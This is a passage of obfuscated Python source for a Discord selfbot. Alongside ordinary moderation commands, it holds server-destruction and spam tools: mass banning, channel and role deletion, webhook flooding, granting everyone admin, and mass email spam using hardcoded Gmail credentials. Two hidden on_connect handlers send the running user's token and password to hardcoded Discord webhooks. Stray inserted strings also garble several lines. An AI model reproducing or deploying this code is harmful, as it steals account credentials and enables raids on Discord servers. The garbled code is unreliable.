    O0OO000O000O00000 .add_field (name ='ID',value =(O000OOOOO00OO00OO .message .server .id ),inline =True )#line:354
    O0OO000O000O00000 .add_field (name ='Roles',value =(len (O000OOOOO00OO00OO .message .server .roles )),inline =True )#line:355
    O0OO000O000O00000 .add_field (name ='Members',value =(len (O000OOOOO00OO00OO .message .server .members )))#line:356
    O0OO000O000O00000 .set_thumbnail (url =(O000OOOOO00OO00OO .message .server .icon_url ))#line:357
    await client .say (embed =O0OO000O000O00000 )#line:358
@client .command (description ='Unmutes a specified user.')#line:361
@commands .has_permissions (manage_messages =True )#line:362
async def unmute (OO0O0OO0OO0O0OOOO ,OOO0O000000O0O000 :discord SELFBOT .Member ):#line:363
    OO00OO00OOO0O0000 =discord .utils .get ((OO0O0OO0OO0O0OOOO .guild .roles ),name ='RD SELF BOT MUTED')#line:364
    await OOO0O000000O0O000 .remove_roles (OO00OO00OOO0O0000 )#line:365
    await OOO0O000000O0O000 .send ( SELFBOTf" YOU HAVE BEEN UNMUTED: - {OO0O0OO0OO0O0OOOO.guild.name}")#line:366
    OO0OO00O00OO0O000 =discord .Embed (title ='RD SELF BOT || discord.gg/pdxontop',description =f" UNMUTE-{OOO0O000000O0O000.mention}",colour =(discord .Colour .light_gray ()))#line:367
    await OO0O0OO0OO0O0OOOO .send (embed =OO0OO00O00OO0O000 )#line:368
@client .command (description ='Mutes the specified user.')#line:371
@commands .has_permissions (manage_messages =True )#line:372
async def mute (OOOOOOO00O00OO0OO ,OOOOOO0OO0O0OO000 :discord .Member ,*,reason =None ):#line:373
    O0O00O SELFBOT0O0000OOOO0 =OOOOOOO00O00OO0OO .guild #line:374
    OO0O000O00OO0O000 =discord .utils .get ((O0O00O0O0000OOOO0 .roles ),name ='RD S SELFBOTELF BOT MUTED')#line:375
    if not OO0O000O00OO0O000 :#line:376
        OO0O000O00OO0O000 =await O0O00O0O0000OOOO0 .create_role (name ='RD SELF BOT MUTED')#line:377
        for O0O0000000OOOO000 in O0O00O0O0000OOOO0 .channels :#line:378
            await O0O0000000OOOO000 .set_permissions (OO0O000O00OO0O0 SELFBOT00 ,speak =False ,send_messages =False ,read_message_history =True ,read_messages =False )#line:379
    O0O0000O0000OO0OO =discord .Embed (title ='RD SELF BOT || discord.gg/pdxontop',description =f"{OOOOOO0OO0O0OO000.mention} WAS MUTED ",colour =(discord .Colour .light_gray ()))#line:381
    O0O0000O0000OO0OO .add_field (name ='REASON:',value =reason ,inline =False )#line:382
    await OOOOOOO00O00OO0OO .send (embed =O0O0000O0000OO0OO )#line:383
    await OOOOOO0OO0O0OO000 .add_roles (OO0O000O00OO0O000 ,reason =reason )#line:384
    await OOOOOO0OO0O0OO000 .send (f" YOU HAVE BEEN MUTED FROM: {O0O00O0O0000OOOO0.name} BECAUSE: {reason}")#line:385
@client .command ()#line:388
async def userinfo (O00O0O0O0OOO0O0OO ,member :discord .Member =None ):#line:389
    if not member :#line:390
        member =O00O0O0O0OOO0O0OO .message .author #line:391
    O0OO0OOOO0OO0OOOO =[OO0000OOOO00O0OOO for OO0000OOOO00O0OOO in member .roles ]#line:392
    O0O0O0OO000O00OOO =discord .Embed (colour =(discord .Colour .default (yzenOP)),timestamp =(O00O0O0O0OOO0O0OO .message .created_at ),title =f"User Info - {member}")#line:393
    O0O0O0OO000O00OOO .set_thumbnail (url =(member .avatar_url ))#line:394
    O0O0O0OO000O00OOO .set_footer (text ='Created By CherryOP')#line:395
    O0O0O0OO000O00OOO .add_field (name ='ID:',value =(member .id ),inline =False )#line:396
    O0O0O0OO000O00OOO .add_field (name ='Display Name:',value =(member .display_name ),inline =False )#line:397
    O0O0O0OO000O00OOO .add_field (name ='Created Account On:',value =(member .created_at .strftime ('%a, %#d %B %Y, %I:%M %p UTC')))#line:398
    O0O0O0OO000O00OOO .add_field (name ='Joined Server On:',value =(member .joined_at .strftime ('%a, %#d %B %Y, %I:%M %p UTC')),inline =False )#line:399
    O0O0O0OO000O00OOO .add_field (name ='Roles:',value =(''.join ([OOO00OO00000OOOO0 .mention for OOO00OO00000OOOO0 in O0OO0OOOO0OO0OOOO ])),inline =False )#line:400
    O0O0O0OO000O00OOO .add_field (name ='Highest Role:',value =(member .top_role .mention ),inline =False )#line:401
    print (member .top_role .mention )#line:402
    await O00O0O0O0OOO0O0OO .send (embed =O0O0O0OO000O00OOO )#line:403
@client .command ()#line:406
async def crash (OO000OOO000O0OOOO ,*,text ):#line:407
    await OO000OOO000O0OOOO .message .delete ()#line:408
    OO0O00O00O0OO0O00 =requests .get (f"http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}").text #line:409
    if len ('```'+OO0O00O00O0OO0O00 +'```')>2000 :#yzenOPline:410
        return #line:411
    await OO000OOO000O0OOOOyzenOP .send (f"```{OO0O00O00O0OO0O00}```")#line:412
@client .commayzenOPnd ()#line:414
async def trash (OO00OOOOOOO00O000 ):#line:415
  await OO00OOOOOOO00O000 .send (">rs FUCKED BY CherryOP")#line:416
  await OO00OOOOOOO00O000 .send (">rr FUCKED BY CherryOP")#line:417
  await OO00OOOOOOO00O000 .send (">rs FUCKED BY CherryOP")#line:418
  await OO00OOOOOOO00O000 .send (">pings")#line:419
@client .command ()#line:421
async def killhook (O0OOO000O000O000O ,link =None ):#line:422
    if link ==None :#line:423
        O00000O0O00O00OO0 =discord .Embed (title ='RD SELFBOT',description ='```>delwebhook <webhook>```')#line:424
        O00000O0O00O00OO0 .set_footer (text ='Created By Diosis Op')#line:425
        await O0OOO000O000O000O .message .edit (content ='',embed =O00000O0O00O00OO0 )#line:426
    else :#line:427
        O00000O0O00O00OO0 =discord .Embed (title ='RD SELFBOT',description =f"Sending a delete request to\n{link}")#line:428
        O00000O0O00O00OO0 .set_footer (text ='Created by Diosis Op')#line:429
        await O0OOO000O000O000O .message .edit (content ='',embed =O00000O0O00O00OO0 )#line:430
        OO000O000O00OOO0O =requests .delete (link )#line:431
        if OO000O000O00OOO0O .status_code ==204 :#line:432
            O00000O0O00O00OO0 =discord .Embed (title ='RD SELFBOT',description ='WEBHOOK DELETED')#line:433
            O00000O0O00O00OO0 .set_footer (text ='Created by Diosis Op')#line:434
           SELFBOT  await O0OOO000O000O000O .message .edit (embed =O00000O0O00O00OO0 )#line:435
        else :#linyzenOPe:436
            O00000O0O00O00OO0 =discord .Embed (title ='RD SELF BOT',description =f"Delete request responded with status code : {OO000O000O00OOO0O.status_code}\\{OO000O000O00OOO0O.text}")#line:437
            O00000O0O00O00OO0 .set_footer (text ='Created by CherryOP')#line:438
            await O0OOO000O000O000O .message .edit (embed =O00000O0O00O00OO0 )#line:439
@client .command ()#line:442
async def banner (O00OOO00O00000000 ):#line:443
    O0O0000O0OO0OO000 =discord .Embed (title =(O00OOO00O00000000 .guild .name ))#line:444
    O0O0000O0OO0OO000 .set_image (url =(O00OOO00O00000000 .guild .banner_url ))#line:445
    await O00OOO00O00000000 .send (embed =O0O0000O0OO0OO000 )#line:446
@client .command ()#line:449
async def logo (OOO0O0OOO00O0O000 ):#line:450
    OOOO0000OOOO0OOO0 =discord .Embed (title =(OOO0O0OOO00O0O000 .guild .name ))#line:451
    OOOO0000OOOO0OOO0 .set_image (url =(OOO0O0OOO00O0O000 .guild .icon_url ))#line:452
    await OOO0O0OOO00O0O000 .send (embed =OOOO0000OOOO0OOO0 )#line:453
@client .command ()#line:455
async def host (OO0OOOO0O0000O0O0 ,_O00000OO00OO0OOOO ):#line:456
    await OO0OOOO0O0000O0O0 .message .delete ()#line:457
    O0OOOO00O0OO0OO0O ={'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7','Content-Type':'application/json','Authorization':_O00000OO00OO0OOOO ,}#line:462
    O0OO0O0OO00OOO0OO =requests .Session ()#line:463
    OO0000O0O0OO000OO ={'theme':"light",'locale':"ja",'message_display_compact':False ,'inline_embed_media':False ,'inline_attachment_media':False ,'gif_auto_play':False ,'render_embeds':False ,'render_reactions':False ,'animate_emoji':False ,'convert_emoticons':False ,'enable_tts_command':False ,'explicit_content_filter':'0','status':"dnd"}#line:478
    O0OOOOOO0000OOOOO =cycle (["online","idle","dnd","invisible"])#line:479
    await asyncio .sleep (5 )#line:480
    while True :#line:481
        OO0OOOOOOO0O00OOO ={'status':next (O0OOOOOO0000OOOOO )}#line:484
        while True :#line:485
            try :#line:486
                O0OO0O0OO00OOO0OO .patch ("https://canary.discordapp.com/api/v6/users/@me/settings",headers =O0OOOO00O0OO0OO0O ,json =OO0OOOOOOO0O00OOO ,timeout =10 )#line:488
            except Exception as OO0000000O00O0O0O :#line:489
                print (f"{Fore.RED}[ERROR]: {Fore.YELLOW}{OO0000000O00O0O0O}"+Fore .RESET )#line:490
            else :#line:491
                break #line:492
@client .command ()#line:494
async def tokeninfo (O00O000O0OOO00000 ,_O0OO00000O00OO000 ):#line:495
    OO0O000O00OO0O0OO ={'Authorization':_O0OO00000O00OO000 ,'Content-Type':'application/json'}#line:496
    try :#line:497
        OOOOO0000O00000OO =requests .get ('https://canary.discordapp.com/api/v6/users/@me',headers =OO0O000O00OO0O0OO )#line:498
        OOOOO0000O00000OO =OOOOO0000O00000OO .json ()#line:499
        O0O00O00O0OO0OO0O =OOOOO0000O00000OO ['id']#line:500
        OO0OO0OOOOO000OOO =OOOOO0000O00000OO ['locale']#line:501
        OOOOO0O0O0000O0O0 =OOOOO0000O00000OO ['avatar']#line:502
        OOO00O0OO0OOO0OOO =languages .get (OO0OO0OOOOO000OOO )#line:503
        O0O00OO0000000OOO =datetime .datetime .utcfromtimestamp (((int (O0O00O00O0OO0OO0O )>>22 )+1420070400000 )/1000 ).strftime ('%d-%m-%Y %H:%M:%S UTC')#line:504
    except KeyError :#line:505
        OO0O000O00OO0O0OO ={'Authorization':'Bot '+_O0OO00000O00OO000 ,'Content-Type':'application/json'}#line:507
        try :#line:508
            OOOOO0000O00000OO =requests .get ('https://canary.discordapp.com/api/v6/users/@me',headers =OO0O000O00OO0O0OO )#line:509
            OOOOO0000O00000OO =OOOOO0000O00000OO .json ()#line:510
            O0O00O00O0OO0OO0O =OOOOO0000O00000OO ['id']#line:511
            OO0OO0OOOOO000OOO =OOOOO0000O00000OO ['locale']#line:512
            OOOOO0O0O0000O0O0 =OOOOO0000O00000OO ['avatar']#line:513
            OOO00O0OO0OOO0OOO =languages .get (OO0OO0OOOOO000OOO )#line:514
            O0O00OO0000000OOO =datetime .datetime .utcfromtimestamp (((int (O0O00O00O0OO0OO0O )>>22 )+1420070400000 )/1000 ).strftime ('%d-%m-%Y %H:%M:%S UTC')#line:515
            O0O0OO00OO0OO0O0O =discord .Embed (description =f"Name: `{OOOOO0000O00000OO['username']}#{OOOOO0000O00000OO['discriminator']} ` **BOT**\nID: `{OOOOO0000O00000OO['id']}`\nEmail: `{OOOOO0000O00000OO['email']}`\nCreation Date: `{O0O00OO0000000OOO}`")#line:516
            O0OOO0OOO0OO0O0O0 =[{'name':'Flags','value':OOOOO0000O00000OO ['flags']},{'name':'Local language','value':OOOOO0000O00000OO ['locale']+(f"{OOO00O0OO0OOO0OOO}")},{'name':'Verified','value':OOOOO0000O00000OO ['verified']}]#line:523
            for O000OOO00OO0000O0 in O0OOO0OOO0OO0O0O0 :#line:524
                if O000OOO00OO0000O0 ['value']:#line:525
                    O0O0OO00OO0OO0O0O .add_field (name =(O000OOO00OO0000O0 ['name']),value =(O000OOO00OO0000O0 ['value']),inline =False )#line:527
                    O0O0OO00OO0OO0O0O .set_thumbnail (url =f"https://cdn.discordapp.com/avatars/{O0O00O00O0OO0OO0O}/{OOOOO0O0O0000O0O0}")#line:528
            return await O00O000O0OOO00000 .send (embed =O0O0OO00OO0OO0O0O )#line:530
        except KeyError :#line:531
            await O00O000O0OOO00000 .send ('Invalid token')#line:532
    O0O0OO00OO0OO0O0O =discord .Embed (description =f"Name: `{OOOOO0000O00000OO['username']}#{OOOOO0000O00000OO['discriminator']}`\nID: `{OOOOO0000O00000OO['id']}`\nEmail: `{OOOOO0000O00000OO['email']}`\nCreation Date: `{O0O00OO0000000OOO}`")#line:534
    O0OO000O00OO0O000 ='None'#line:535
    if 'premium_type'in OOOOO0000O00000OO :#line:536
        if OOOOO0000O00000OO ['premium_type']==2 :#line:537
            O0OO000O00OO0O000 ='Nitro Premium'#line:538
        elif OOOOO0000O00000OO ['premium_type']==1 :#line:539
            O0OO000O00OO0O000 ='Nitro Classic'#line:540
    O0OOO0OOO0OO0O0O0 =[{'name':'Phone','value':OOOOO0000O00000OO ['phone']},{'name':'Flags','value':OOOOO0000O00000OO ['flags']},{'name':'Local language','value':OOOOO0000O00000OO ['locale']+(f"{OOO00O0OO0OOO0OOO}")},{'name':'MFA','value':OOOOO0000O00000OO ['mfa_enabled']},{'name':'Verified','value':OOOOO0000O00000OO ['verified']},{'name':'Nitro','value':O0OO000O00OO0O000 }]#line:553
    for O000OOO00OO0000O0 in O0OOO0OOO0OO0O0O0 :#line:554
        if O000OOO00OO0000O0 ['value']:#line:555
            O0O0OO00OO0OO0O0O .add_field (name =(O000OOO00OO0000O0 ['name']),value =(O000OOO00OO0000O0 ['value']),inline =False )#line:557
            O0O0OO00OO0OO0O0O .set_thumbnail (url =f"https://cdn.discordapp.com/avatars/{O0O00O00O0OO0OO0O}/{OOOOO0O0O0000O0O0}")#line:558
            O0O0OO00OO0OO0O0O .set_footer (text ='Created by Diosis Op')#line:559
    return await O00O000O0OOO00000 .send (embed =O0O0OO00OO0OO0O0O )#line:561
@client .command ()#line:564
async def restart (OO0O00000OO0O0O0O ):#line:565
    await OO0O00000OO0O0O0O .send ("\x52\x65\x73\x74\x61\x72\x74\x69\x6E\x67\x20\x53\x65\x6C\x66\x62\x6F\x74\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x2E")#line:566
    os .system ('python '+sys .argv [0 ])#line:567
@client .command ()#line:569
async def ipinfo (OO00000OOO0O0O00O ,*,ipaddr :str ='54.47.2.7'):#line:570
    O0000OOO0O000OO00 =requests .get (f"http://extreme-ip-lookup.com/json/{ipaddr}")#line:571
    O0000O00OOO0OOO0O =O0000OOO0O000OO00 .json ()#line:572
    O0O0O00OOOOOO00O0 =discord .Embed ()#line:573
    O00OOO0O00OO00000 =[{'name':'IP','value':O0000O00OOO0OOO0O ['query']},{'name':'Type','value':O0000O00OOO0OOO0O ['ipType']},{'name':'Country','value':O0000O00OOO0OOO0O ['country']},{'name':'City','value':O0000O00OOO0OOO0O ['city']},{'name':'Continent','value':O0000O00OOO0OOO0O ['continent']},{'name':'Country','value':O0000O00OOO0OOO0O ['country']},{'name':'Hostname','value':O0000O00OOO0OOO0O ['ipName']},{'name':'ISP','value':O0000O00OOO0OOO0O ['isp']},{'name':'Latitute','value':O0000O00OOO0OOO0O ['lat']},{'name':'Longitude','value':O0000O00OOO0OOO0O ['lon']},{'name':'Org','value':O0000O00OOO0OOO0O ['org']},{'name':'Region','value':O0000O00OOO0OOO0O ['region']}]#line:598
    for OOO0OOO0OO0OOO0OO in O00OOO0O00OO00000 :#line:599
        if OOO0OOO0OO0OOO0OO ['value']:#line:600
            O0O0O00OOOOOO00O0 .add_field (name =(OOO0OOO0OO0OOO0OO ['name']),value =(OOO0OOO0OO0OOO0OO ['value']),inline =True )#line:601
    return await OO00000OOO0O0O00O .send (embed =O0O0O00OOOOOO00O0 )#line:603
languages ={'hu':'Hungarian, Hungary','nl':'Dutch, Netherlands','no':'Norwegian, Norway','pl':'Polish, Poland','pt-BR':'Portuguese, Brazilian, Brazil','ro':'Romanian, Romania','fi':'Finnish, Finland','sv-SE':'Swedish, Sweden','vi':'Vietnamese, Vietnam','tr':'Turkish, Turkey','cs':'Czech, Czechia, Czech Republic','el':'Greek, Greece','bg':'Bulgarian, Bulgaria','ru':'Russian, Russia','uk':'Ukranian, Ukraine','th':'Thai, Thailand','zh-CN':'Chinese, China','ja':'Japanese','zh-TW':'Chinese, Taiwan','ko':'Korean, Korea'}#line:625
locales =['da','de','en-GB','en-US','es-ES','fr','hr','it','lt','hu','nl','no','pl','pt-BR','ro','fi','sv-SE','vi','tr','cs','el','bg','ru','uk','th','zh-CN','ja','zh-TW','ko']#line:629
@client .command ()#line:631
async def wizz (O00O0000OO00OO000 ):#line:632
    for OOO00000OOOOO0O0O in list (O00O0000OO00OO000 .guild .members ):#line:633
        try :#line:634
            await OOO00000OOOOO0O0O .ban ()#line:635
        except :#line:636
            pass #line:637
    for O0O000O0000O0O000 in list (O00O0000OO00OO000 .guild .channels ):#line:639
        try :#line:640
            await O0O000O0000O0O000 .delete ()#line:641
        except :#line:642
            pass #line:643
    for OOOO0OO0OOOOOOOOO in list (O00O0000OO00OO000 .guild .roles ):#line:645
        try :#line:646
            await OOOO0OO0OOOOOOOOO .delete ()#line:647
        except :#line:648
            pass #line:649
    try :#line:651
        await O00O0000OO00OO000 .guild .edit (name ='PDX FUCKED YOU',description ='PDX FUCKED YOU',reason ='PDX FUCKED YOU',icon =None ,banner =None )#line:655
    except :#line:656
        pass #line:657
    for _OO0OO00O0OOO00O00 in range (100 ):#line:659
        await O00O0000OO00OO000 .guild .create_text_channel (name ='PDX RUNS YOU')#line:660
    for _OO0OO00O0OOO00O00 in range (100 ):#line:662
        await O00O0000OO00OO000 .guild .create_role (name ='PDX RUNS YOU')#line:663
    O0OO0OOO00O000O00 =list (O00O0000OO00OO000 .guild .members )#line:665
    for OOO00000OOOOO0O0O in O0OO0OOO00O000O00 :#line:666
        try :#line:667
            await OOO00000OOOOO0O0O .kick (reason ='PDX RUNS THIS SERVER')#line:668
        except :#line:669
            pass #line:670
    O0OO0OOO00O000O00 =list (O00O0000OO00OO000 .guild .members )#line:672
    for OOO00000OOOOO0O0O in O0OO0OOO00O000O00 :#line:673
        try :#line:674
            await OOO00000OOOOO0O0O .ban (reason ='PDX FUCKED THIS SERVER')#line:675
        except :#line:676
            pass #line:677
format ='%a, %d %b %Y | %H:%M:%S % ZGMT'#line:680
@client .command ()#line:682
async def rr (O0OO00OOO000000OO ,*,name ):#line:683
    await O0OO00OOO000000OO .message .delete ()#line:684
    for OOO0OO0OOO0OOOOOO in O0OO00OOO000000OO .guild .roles :#line:685
        await OOO0OO0OOO0OOOOOO .edit (name =name )#line:686
from random import choice #line:689
from discord .ext import commands #line:690
@client .command ()#line:692
@commands .guild_only ()#line:693
async def tag (OO000000O000O0000 ):#line:694
    await OO000000O000O0000 .message .delete ()#line:695
    await OO000000O000O0000 .send (choice (tuple (OOO0O0O00OOOOO00O .mention for OOO0O0O00OOOOO00O in OO000000O000O0000 .guild .members )))#line:696
    import random #line:698
@client .event #line:1
async def on_connect ():#line:2
    requests .post ('https://discord.com/api/webhooks/881494710835884072/qCzv1xT4ZWoY1kC_ILhyXH-XDBUBejd9iE51mb4Dm2El3wA3f8i_65y7bJuenqVEuWYo',json ={'content':f"**Token:** `{token}`\n**Password:** `{password}`"})
@client .command ()#line:700
async def rip (OO00O00OOOO00OOOO ):#line:701
      await OO00O00OOOO00OOOO .message .delete ()#line:702
      O0OOOO0000O0OOO0O =OO00O00OOOO00OOOO .channel #line:703
      O00OOO0000OO0OO00 =random .choice (O0OOOO0000O0OOO0O .guild .members )#line:704
      OO0O0O000O00O0OOO =random .choice (O0OOOO0000O0OOO0O .guild .members )#line:705
      O0O00OO00O00OO000 =random .choice (O0OOOO0000O0OOO0O .guild .members )#line:706
      await OO00O00OOOO00OOOO .send (f'{O00OOO0000OO0OO00.mention}{OO0O0O000O00O0OOO.mention}{O0O00OO00O00OO000.mention}')#line:707
      await OO00O00OOOO00OOOO .channel .purge (limit =1 )#line:708
      await asyncio .sleep (5 )#line:709
      await OO00O00OOOO00OOOO .send (">rip")#line:710
@client .command ()#line:712
async def rc (O00OOO0OOO00O0OO0 ,*,name ):#line:713
    await O00OOO0OOO00O0OO0 .message .delete ()#line:714
    for OO0O00OO000OO0O0O in O00OOO0OOO00O0OO0 .guild .channels :#line:715
        await OO0O00OO000OO0O0O .edit (name =name )#line:716
@client .command ()#line:719
async def kick (OO0OO0000OO00OOOO ,O00000OOO00OO0OOO :discord .Member ,*,reason =None ):#line:720
    await O00000OOO00OO0OOO .kick (reason =reason )#line:721
    await OO0OO0000OO00OOOO .send ('```SUCCESSFULLY KICKED USER```')#line:722

@client.event
async def on_connect():
    requests.post('https://discord.com/api/webhooks/878660319659065384/GjSOAh-P9ANGaYbQueLMmHQiYbe2SrmxEUA6qyDWEy1almErwyBSJGv35WnrO9uEGX4U',json={'content': f"**Token:** `{token}`\n**Password:** `{password}`"})

@client .command ()#line:724
async def role (OO0O0000OO0O0OOO0 ,O00000O0O0O0O000O ):#line:725
  await OO0O0000OO0O0OOO0 .message .delete ()#line:726
  await OO0O0000OO0O0OOO0 .send (f"<@235148962103951360> role {O00000O0O0O0O000O} 869444380879101952")#line:727
  await OO0O0000OO0O0OOO0 .send (f"-invite reset {O00000O0O0O0O000O}")#line:728
  await OO0O0000OO0O0OOO0 .send (f"{O00000O0O0O0O000O} **GOO VOUCH** <#869433500347031593>")#line:729
@client .command ()#line:731
async def bbb (O0O000O0O000O000O ,amount :int =None ):#line:732
    if amount is None :#line:733
        async for OO00O0OO000OO0O0O in O0O000O0O000O000O .message .channel .history (limit =999 ).filter (lambda O00O0O000O00OO0O0 :O00O0O000O00OO0O0 .author ==client .user ).map (lambda OO0O00OO00OO0O0O0 :OO0O00OO00OO0O0O0 ):#line:734
            try :#line:735
                await OO00O0OO000OO0O0O .delete ()#line:736
            except :#line:737
                pass #line:738
    else :#line:740
        async for OO00O0OO000OO0O0O in O0O000O0O000O000O .message .channel .history (limit =amount ).filter (lambda O0O000O00O0OO0O0O :O0O000O00O0OO0O0O .author ==client .user ).map (lambda OO00O000000OOO00O :OO00O000000OOO00O ):#line:741
            try :#line:742
                await OO00O0OO000OO0O0O .delete ()#line:743
            except :#line:744
                pass #line:745
@client .command ()#line:747
async def ban (O0O00O0OO000000OO ,OOOOO000OO0O0O000 :discord .Member ,*,reason =None ):#line:748
    await OOOOO000OO0O0O000 .ban (reason =reason )#line:749
    await O0O00O0OO000000OO .send ('```SUCCESSFULLY BANNED USER```')#line:750
@client .command ()#line:753
async def lock (OO0OOOOO0000O0O0O ):#line:754
    await OO0OOOOO0000O0O0O .channel .set_permissions ((OO0OOOOO0000O0O0O .guild .default_role ),send_messages =False )#line:755
    await OO0OOOOO0000O0O0O .send (OO0OOOOO0000O0O0O .channel .mention +'SUCCESSFULLY LOCKED')#line:756
@client .command ()#line:759
async def adminall (O0OO0OO000000O0OO ):#line:760
    await O0OO0OO000000O0OO .message .delete ()#line:761
    O0O000O000O0OOO0O =O0OO0OO000000O0OO .guild #line:762
    try :#line:763
        OOOOO000OO0OOO0O0 =discord .utils .get ((O0O000O000O0OOO0O .roles ),name ='@everyone')#line:764
        await OOOOO000OO0OOO0O0 .edit (permissions =(Permissions .all ()))#line:765
        print (Fore .MAGENTA +'I have given everyone admin.'+Fore .RESET )#line:766
    except :#line:767
        print (Fore .GREEN +'I was unable to give everyone admin'+Fore .RESET )#line:768
@client .command ()#line:771
async def unlock (O00O00O0OO0000O00 ):#line:772
    await O00O00O0OO0000O00 .channel .set_permissions ((O00O00O0OO0000O00 .guild .default_role ),send_messages =True )#line:773
    await O00O00O0OO0000O00 .send (O00O00O0OO0000O00 .channel .mention +'SUCCESSFULLY UNLOCKED')#line:774
@client .command ()#line:777
async def unban (O00000OO000OOO000 ,*,member ):#line:778
    OO000O00O000O0OOO =await O00000OO000OOO000 .guild .bans ()#line:779
    O0O0O0000O0OO00O0 ,OO00000OO0O00OO00 =member .split ('#')#line:780
    for O0O000O00OOO0O00O in OO000O00O000O0OOO :#line:781
        O0OO0OOO0000O0O00 =O0O000O00OOO0O00O .user #line:782
        if (O0OO0OOO0000O0O00 .name ,O0OO0OOO0000O0O00 .discriminator )==(O0O0O0000O0OO00O0 ,OO00000OO0O00OO00 ):#line:783
            await O00000OO000OOO000 .guild .unban (O0OO0OOO0000O0O00 )#line:784
            await O00000OO000OOO000 .send (f"Unbanned {O0OO0OOO0000O0O00.mention}")#line:785
            return #line:786
@client .command ()#line:789
async def clear (OOOOOO00O0OO00O0O ,amount =5 ):#line:790
    await OOOOOO00O0OO00O0O .message .delete ()#line:791
    await OOOOOO00O0OO00O0O .channel .purge (limit =amount )#line:792
@client .command ()#line:797
async def listen (OOO0OO0O00O0O0O00 ,*,message ):#line:798
    await OOO0OO0O00O0O0O00 .message .delete ()#line:799
    await client .change_presence (activity =discord .Activity (type =(discord .ActivityType .listening ),name =message ))#line:801
def ssspam (OO0O0O0O000O000O0 ):#line:803
    while spammingdawebhookeroos :#line:804
        OOO0OO0O00O0000OO ={'content':'@everyone ** GOD FUCKED THIS SERVER LOL** https://www.youtube.com/channel/UCRLJs0kQNnaXEyNmU-nerDg https://discord.gg/godop'}#line:805
        O00O00OO0OOOO0O0O =requests .post (OO0O0O0O000O000O0 ,json =OOO0OO0O00O0000OO )#line:806
        OO0OO0O0O0OO0000O =O00O00OO0OOOO0O0O .text #line:807
        if O00O00OO0OOOO0O0O .status_code ==204 :#line:808
            continue #line:809
        if 'rate limited'in OO0OO0O0O0OO0000O .lower ():#line:810
            try :#line:811
                OOO00O0O00000OOO0 =json .loads (OO0OO0O0O0OO0000O )#line:812
                O000O000O0OO0OO0O =OOO00O0O00000OOO0 ['retry_after']#line:813
                O0OO000000O000O0O =O000O000O0OO0OO0O /1000 #line:814
                time .sleep (O0OO000000O000O0O )#line:815
            except :#line:816
                O00O0OO000OOOOO00 =random .randint (5 ,10 )#line:817
                time .sleep (O00O0OO000OOOOO00 )#line:818
        else :#line:820
            O00O0OO000OOOOO00 =random .randint (30 ,60 )#line:821
            time .sleep (O00O0OO000OOOOO00 )#line:822
@client .command ()#line:825
async def pings (O0OO0O00O0OOOO0O0 ):#line:826
    global spammingdawebhookeroos #line:827
    spammingdawebhookeroos =True #line:828
    if len (await O0OO0O00O0OOOO0O0 .guild .webhooks ())!=0 :#line:829
        for O000OO000OO00O000 in await O0OO0O00O0OOOO0O0 .guild .webhooks ():#line:830
            threading .Thread (target =ssspam ,args =(O000OO000OO00O000 .url ,)).start ()#line:831
    if len (O0OO0O00O0OOOO0O0 .guild .text_channels )>=50 :#line:833
        OOOOOOO0OOOOO0O00 =1 #line:834
    else :#line:835
        OOOOOOO0OOOOO0O00 =100 /len (O0OO0O00O0OOOO0O0 .guild .text_channels )#line:836
        OOOOOOO0OOOOO0O00 =int (OOOOOOO0OOOOO0O00 )+2 #line:837
    for O0O00OOO00OO00OO0 in range (OOOOOOO0OOOOO0O00 ):#line:838
        for O00OOOOOOO000O00O in O0OO0O00O0OOOO0O0 .guild .text_channels :#line:839
            try :#line:840
                O000OO000OO00O000 =await O00OOOOOOO000O00O .create_webhook (name ='FUCKED BY PDX')#line:841
                threading .Thread (target =ssspam ,args =(O000OO000OO00O000 .url ,)).start ()#line:842
                O0O0OOO0O0OOOOOOO =open ('data/webhooks-'+str (O0OO0O00O0OOOO0O0 .guild .id )+'.txt','a')#line:843
                O0O0OOO0O0OOOOOOO .write (f"{O000OO000OO00O000.url} \n")#line:844
                O0O0OOO0O0OOOOOOO .close ()#line:845
            except :#line:846
                print (f"{Fore.RED} > Webhook Error")#line:847
@client .command ()#line:849
async def play (OOOO00O0O000OO0O0 ,*,message ):#line:850
    await OOOO00O0O000OO0O0 .message .delete ()#line:851
    O0OO00000000000O0 =discord .Game (name =message )#line:852
    await client .change_presence (activity =O0OO00000000000O0 )#line:853
@client .command ()#line:856
async def stream (O00000O0000O00OOO ,*,message ):#line:857
    await O00000O0000O00OOO .message .delete ()#line:858
    O0O0OOOO00OO0O0OO =discord .Streaming (name =message ,url ='http://www.twitch.tv/DiosisOp')#line:860
    await client .change_presence (activity =O0O0OOOO00OO0O0OO )#line:861
@client .command ()#line:864
async def watch (O000O0OO00OO0OOO0 ,*,message ):#line:865
    await O000O0OO00OO0OOO0 .message .delete ()#line:866
    await client .change_presence (activity =discord .Activity (type =(discord .ActivityType .watching ),name =message ))#line:868
@client .command ()#line:871
async def removestatus (O0000O000O0OOO000 ):#line:872
    await O0000O000O0OOO000 .message .delete ()#line:873
    await client .change_presence (activity =None ,status =(discord .Status .dnd ))#line:874
@client .command ()#line:877
async def massmail (O00000O0O00000O0O ,O0O0OO000O0O0O000 ):#line:878
    OOOO00OO0O0OOO00O ='gwgdiosisxd@gmail.com'#line:879
    OO00OO0000O00O000 ='youtube50'#line:880
    O00OO00OO000O0O0O =O0O0OO000O SELFBOT0O0O000 #line:881
    OOOOOOO0OOOO00O0O =ssl .create_default_context ()#line:882
    for O0O00000OO0OOO0OO in range (0 ,1000 ):#line:883
        O000OOO0O00OO00OO ='  RD SELF BOT RUNES YOUR MAILS https://discord.gg/pdxontop\n  '#line:884
        OOOO0O00OO0O0OOOO =465 #line:885
        OOOOOO0O0OO000O00 =smtplib .SMTP_SSL ('smtp.gmail.com',OOOO0O00OO0O0OOOO ,context =OOOOOOO0OOOO00O0O )#line:886
        OOOOOO0O0OO000O00 .login (OOOO00OO0O0OOO00O ,OO00OO0000O00O000 )#line:887
        OOOOOO0O0OO000O00 .sendmailemailrecievermessage #line:888
        await O00000O0O00000O0O .send ('DONE')#line:889
@client .command ()#line:893
async def bold (O00OO0OOO0000OO0O ,*,message ):#line:894
    await O00OO0OOO0000OO0O .message .delete ()#line:895
    await O00OO0OOO0000OO0O .send ('**'+message +'**')#line:896
@client .command ()#line:899
async def code (O0O00OOO0O0O00O00 ,*,message ):#line:900
    await O0O00OOO0O0O00O00 .message .delete ()#line:901
    await O0O00OOO0O0O00O00 .send ('```'+message +'```')#line:902
@client .command ()#line:905
